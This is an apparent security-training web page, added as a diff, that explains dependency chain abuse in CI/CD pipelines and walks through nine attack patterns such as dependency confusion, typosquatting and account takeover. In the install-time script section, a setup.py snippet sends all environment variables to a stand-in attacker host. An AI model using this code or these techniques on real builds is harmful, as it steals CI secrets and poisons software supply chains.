@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CICD-SEC-3: Dependency Chain Abuse - Attack Vectors</title>
+    <link rel="stylesheet" href="/platform/frontend/js/dashboard.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .doc-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+
+        .back-nav {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 10px 20px;
+            margin-bottom: 30px;
+            color: var(--primary-color);
+            text-decoration: none;
+            border: 1px solid var(--border-color);
+            border-radius: 5px;
+            transition: all 0.3s;
+        }
+
+        .back-nav:hover {
+            background-color: rgba(245, 158, 11, 0.1);
+            border-color: var(--primary-color);
+            box-shadow: none;
+        }
+
+        .content {
+            background: var(--card-bg);
+            border-radius: 8px;
+            padding: 40px;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 2px 10px rgba(245, 158, 11, 0.1);
+        }
+
+        .content h1 {
+            color: var(--primary-color);
+            font-size: 2.5rem;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid var(--primary-color);
+            text-shadow: none;
+        }
+
+        .content h2 {
+            color: var(--secondary-color);
+            font-size: 1.8rem;
+            margin-top: 40px;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .content h3 {
+            color: var(--primary-color);
+            font-size: 1.4rem;
+            margin-top: 30px;
+            margin-bottom: 12px;
+        }
+
+        .content h4 {
+            color: var(--secondary-color);
+            font-size: 1.2rem;
+            margin-top: 25px;
+            margin-bottom: 10px;
+        }
+
+        .content p {
+            color: var(--text-color);
+            line-height: 1.8;
+            margin-bottom: 15px;
+        }
+
+        .content ul, .content ol {
+            margin-left: 25px;
+            margin-bottom: 15px;
+            color: var(--text-color);
+        }
+
+        .content li {
+            margin-bottom: 10px;
+            line-height: 1.6;
+        }
+
+        .content code {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 2px 8px;
+            border-radius: 4px;
+            color: var(--primary-color);
+            font-family: 'Courier New', monospace;
+            border: 1px solid var(--border-color);
+        }
+
+        .content pre {
+            background: rgba(0, 0, 0, 0.4);
+            padding: 20px;
+            border-radius: 8px;
+            overflow-x: auto;
+            margin: 20px 0;
+            border: 1px solid var(--primary-color);
+            box-shadow: none;
+        }
+
+        .content pre code {
+            background: none;
+            padding: 0;
+            border: none;
+            color: var(--primary-color);
+        }
+
+        .content blockquote {
+            border-left: 4px solid var(--primary-color);
+            padding-left: 20px;
+            margin: 20px 0;
+            background: rgba(245, 158, 11, 0.05);
+            padding: 15px 20px;
+            border-radius: 4px;
+        }
+
+        .content table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+            border: 1px solid var(--border-color);
+        }
+
+        .content table th {
+            background: linear-gradient(135deg, rgba(245, 158, 11, 0.2), rgba(251, 191, 36, 0.2));
+            color: var(--primary-color);
+            padding: 12px;
+            text-align: left;
+            border: 1px solid var(--border-color);
+        }
+
+        .content table td {
+            padding: 12px;
+            border: 1px solid var(--border-color);
+            color: var(--text-color);
+        }
+
+        .content table tr:hover {
+            background: rgba(245, 158, 11, 0.05);
+        }
+
+        .content a {
+            color: var(--secondary-color);
+            text-decoration: none;
+            border-bottom: 1px solid transparent;
+            transition: all 0.3s;
+        }
+
+        .content a:hover {
+            color: var(--primary-color);
+            border-bottom-color: var(--primary-color);
+        }
+
+        .content strong {
+            color: var(--secondary-color);
+            font-weight: 600;
+        }
+
+        .toc {
+            background: rgba(245, 158, 11, 0.05);
+            border: 1px solid var(--primary-color);
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 30px;
+        }
+
+        .toc h2 {
+            color: var(--primary-color);
+            margin-top: 0;
+            border-bottom: 2px solid var(--primary-color);
+            padding-bottom: 10px;
+        }
+
+        .toc ul {
+            list-style: none;
+            margin-left: 0;
+        }
+
+        .toc li {
+            margin-bottom: 8px;
+        }
+
+        .toc a {
+            color: var(--text-color);
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .toc a:hover {
+            color: var(--primary-color);
+        }
+
+        .toc a:before {
+            content: "▸";
+            color: var(--primary-color);
+        }
+    </style>
+</head>
+<body>
+    <div class="doc-container">
+        <a href="/learn/cicd" class="back-nav">← Back</a>
+
+        <div class="content">
+            <h1>CICD-SEC-3: Dependency Chain Abuse - Attack Vectors</h1>
+
+<div class="toc">
+<h2>Table of Contents</h2>
+<ul>
+<li><a href="#understanding">Understanding Dependency Chain Attack Vectors</a></li>
+<li><a href="#core-attack-flow">Core Attack Flow</a></li>
+<li><a href="#common-attack-patterns">Common Attack Patterns</a></li>
+<li><a href="#chaining">Chaining the Abuse</a></li>
+</ul>
+</div>
+
+<h2 id="understanding">Understanding Dependency Chain Attack Vectors</h2>
+
+<blockquote>
+<p><strong>⚠️ EDUCATIONAL PURPOSE ONLY</strong> &mdash; the techniques below are described so you can find and fix these weaknesses in build systems you own or are authorised to test. Publishing malicious packages or targeting names you do not control is illegal.</p>
+</blockquote>
+
+<p>Dependency Chain Abuse is not exploited by breaking into your network. The attacker never touches your infrastructure directly&mdash;they publish or poison a package on a registry your build already trusts, then wait for your pipeline to fetch it. The entire attack happens through the <strong>normal, automated dependency-resolution process</strong>, which is exactly why it is so hard to notice.</p>
+
+<p>The attacker's goal is one of:</p>
+<ul>
+<li>Get a build to resolve a <strong>malicious artifact</strong> in place of the intended one (confusion, typosquat, brandjack).</li>
+<li>Poison an <strong>already-trusted</strong> package the build depends on (hijack, transitive).</li>
+<li>Turn a fetched package into <strong>code execution</strong> on the build agent via install-time scripts.</li>
+</ul>
+
+<h3 id="core-attack-flow">Core Attack Flow</h3>
+
+<pre><code>1. Discover
+   &darr;
+   Harvest internal package names, versions, and registry config
+   from public commits, error logs, bundles, job posts
+2. Position
+   &darr;
+   Publish a malicious public package (same/typo/brand name) OR
+   hijack an existing maintainer account / abandoned package
+3. Win resolution
+   &darr;
+   Higher version, public fallback, or the poisoned update is pulled
+4. Execute
+   &darr;
+   postinstall / setup.py runs on the build agent as the CI user
+5. Escalate / Exfiltrate
+   &darr;
+   Steal secrets, poison the artifact, pivot into internal systems</code></pre>
+
+<h2 id="common-attack-patterns">Common Attack Patterns</h2>
+
+<h3>1. Dependency Confusion via Public Fallback</h3>
+
+<p>The build resolves an unscoped internal name and the resolver can reach the public registry, which returns a higher-versioned malicious copy.</p>
+
+<pre><code># Internal name used in the manifest (no scope):
+#   "acme-billing-client": "^1.2.0"
+#
+# Attacker publishes to the PUBLIC registry:
+npm publish            # name: acme-billing-client, version: 99.99.99
+
+# Build runs with public fallback enabled:
+npm install
+#   internal registry has 1.2.4
+#   public  registry has 99.99.99  &lt;- higher version wins
+#   -&gt; malicious 99.99.99 is fetched and its postinstall runs</code></pre>
+
+<p><strong>Payoff</strong>: code execution with no typo and no social engineering&mdash;the version-selection rule does the work. The same class applies to pip (<code>--extra-index-url</code> merging indexes), Maven (public repo before private), and others.</p>
+
+<h3>2. Typosquatting a Popular Name</h3>
+
+<p>The attacker registers names one edit away from heavily-used packages and waits for a mistyped manifest or copy-paste error.</p>
+
+<pre><code># Legit vs. squat (illustrative shapes):
+requests   -&gt; reqeusts / request-lib / python-requests-
+lodash     -&gt; loadsh / lodahs / lodash-js
+express    -&gt; expres / express-js-
+
+# In a manifest a single wrong character resolves to the squat:
+pip install reqeusts      # setup.py runs attacker code on install</code></pre>
+
+<p><strong>Payoff</strong>: the malicious package installs and runs before anyone notices the name is <em>almost</em> right. Auto-generated or AI-suggested manifests amplify this.</p>
+
+<h3>3. Brandjacking a Trusted Namespace</h3>
+
+<p>Rather than a typo, the name borrows a brand's authority so it looks official.</p>
+
+<pre><code># Names crafted to look vendor-blessed:
+acme-official-sdk        node-acme-payments
+acme-cloud-cli           @acme-partners/connector   # look-alike scope
+
+# A developer trusts the brand and installs it:
+npm install acme-official-sdk</code></pre>
+
+<p><strong>Payoff</strong>: the victim believes they installed a first-party package. Brandjacking often pairs with a convincing README and inflated download counts.</p>
+
+<h3>4. Maintainer Account Takeover</h3>
+
+<p>The attacker seizes an existing, trusted package and ships a malicious version to everyone who upgrades.</p>
+
+<pre><code># Common takeover paths:
+- Reused/leaked maintainer password, no MFA on the registry account
+- Expired domain behind the maintainer's email -&gt; password reset
+- Registry API/publish token leaked in a public repo or CI log
+
+# Result: a real package you already depend on gets a poisoned release:
+good-logger  4.7.2  (clean)  ->  4.7.3  (malicious, same trusted name)</code></pre>
+
+<p><strong>Payoff</strong>: the poisoned version is already in the ecosystem's lockfiles and pulls in on the next upgrade&mdash;no new name to detect.</p>
+
+<h3>5. Abandoned / Expired Package Reuse</h3>
+
+<p>A deleted or de-published name, or one whose maintainer vanished, is re-registered by an attacker who then serves malware under the trusted-looking name.</p>
+
+<pre><code># A dependency references a name that was unpublished/abandoned:
+#   "tiny-helper": "^0.3.0"
+# Attacker re-registers "tiny-helper" on the public registry
+# -&gt; builds that still reference it now fetch attacker code</code></pre>
+
+<p><strong>Payoff</strong>: trust attached to the old name is inherited by the new, malicious owner.</p>
+
+<h3>6. Install-Time Script Execution</h3>
+
+<p>Once any malicious package is resolved, lifecycle scripts run automatically&mdash;this is the actual code-execution step for most of the classes above.</p>
+
+<pre><code>// package.json in the malicious package
+{ "scripts": { "postinstall": "node ./collect.js" } }
+
+// Python equivalent — arbitrary code in setup.py at install time
+# setup.py
+import os, urllib.request, json
+urllib.request.urlopen("https://attacker.example/x",
+    data=json.dumps(dict(os.environ)).encode())   # secrets leave the agent</code></pre>
+
+<p><strong>Payoff</strong>: RCE on the build agent as the CI user&mdash;before your code runs and whether or not you import the package.</p>
+
+<h3>7. Misconfigured Registry Resolution</h3>
+
+<p>Configuration that consults public before private, merges indexes, or lacks scope pinning turns a benign manifest into a confusion target.</p>
+
+<pre><code># .npmrc that leaves a private scope open to public fallback:
+registry=https://registry.npmjs.org/          # public is the default
+# (no scope-&gt;registry mapping for @acme, so @acme can resolve publicly)
+
+# pip merging a private index WITH PyPI — highest version across both wins:
+pip install -r requirements.txt \
+    --index-url https://pypi.org/simple \
+    --extra-index-url https://pypi.internal/acme/simple</code></pre>
+
+<p><strong>Payoff</strong>: the resolver, not the attacker, chooses the malicious copy&mdash;because the config told it public was fair game.</p>
+
+<h3>8. Lockfile and Cache Poisoning</h3>
+
+<p>A single bad resolution is captured into a lockfile or a shared build cache and then trusted by every later build.</p>
+
+<pre><code># A confusion win during one loose install writes the malicious
+# version + resolved URL into the lockfile:
+#   "acme-billing-client": { "version": "99.99.99",
+#      "resolved": "https://registry.npmjs.org/..." }
+# Every subsequent `npm ci` now faithfully re-installs the malicious pin.</code></pre>
+
+<p><strong>Payoff</strong>: persistence&mdash;the poisoning survives long after the attacker's package is removed from the registry.</p>
+
+<h3>9. Transitive Graph Poisoning</h3>
+
+<p>The attacker compromises a deep, indirect dependency; it rides upward into your build even though you never named it.</p>
+
+<pre><code>your-app
+└─ ui-widgets        (you chose this)
+   └─ color-parse    (you did not)
+      └─ str-utils    (compromised — attacker code lives here)</code></pre>
+
+<p><strong>Payoff</strong>: depth is camouflage&mdash;nobody audits <code>str-utils</code>, yet its install script runs in your pipeline.</p>
+
+<h2 id="chaining">Chaining the Abuse</h2>
+
+<p>Real intrusions stitch these steps together:</p>
+
+<pre><code>Leaked internal name in a public commit   -&gt; pick a confusion target
+        +
+Public fallback enabled in .npmrc         -&gt; malicious 99.99.99 wins
+        +
+postinstall runs on the build agent       -&gt; steal CI + cloud tokens
+        =  build-agent compromise and secret theft, no infra break-in</code></pre>
+
+<p>Another common chain:</p>
+
+<pre><code>Maintainer account takeover (no MFA)      -&gt; poison a trusted transitive dep
+        -&gt; poisoned version pulled on next upgrade
+        -&gt; artifact is built, signed, and shipped by your own pipeline
+        -&gt; every downstream consumer receives the malware</code></pre>
+
+<h2>Key Takeaways</h2>
+
+<ol>
+<li><strong>The attacker uses your own resolver</strong>&mdash;they publish or poison, and the build fetches; no direct intrusion is needed.</li>
+<li><strong>Names are the weapon</strong>&mdash;confusion, typosquats, and brandjacks all abuse trust in a human-friendly name.</li>
+<li><strong>Installing is executing</strong>&mdash;lifecycle scripts turn a fetched package into RCE on the build agent.</li>
+<li><strong>Trusted packages get poisoned too</strong>&mdash;account takeover and transitive compromise bypass "reputable-only" rules.</li>
+<li><strong>Bad resolutions persist</strong>&mdash;lockfiles and caches faithfully re-install a poisoned pin long after takedown.</li>
+</ol>
+
+<h2>Next Steps</h2>
+
+<ul>
+<li><strong><a href="prevention.html">Prevention Guide</a></strong>: Control resolution so these vectors cannot win</li>
+<li><strong><a href="examples.html">Code Examples</a></strong>: Insecure vs. secure package-manager configuration</li>
+<li><strong><a href="/learn/cicd">CI/CD Security Track</a></strong>: Continue the OWASP CI/CD Top 10</li>
+<li><strong><a href="/practice">Practice</a></strong>: Apply these controls hands-on</li>
+</ul>
+
+        </div>
+    </div>
+</body>
+</html>
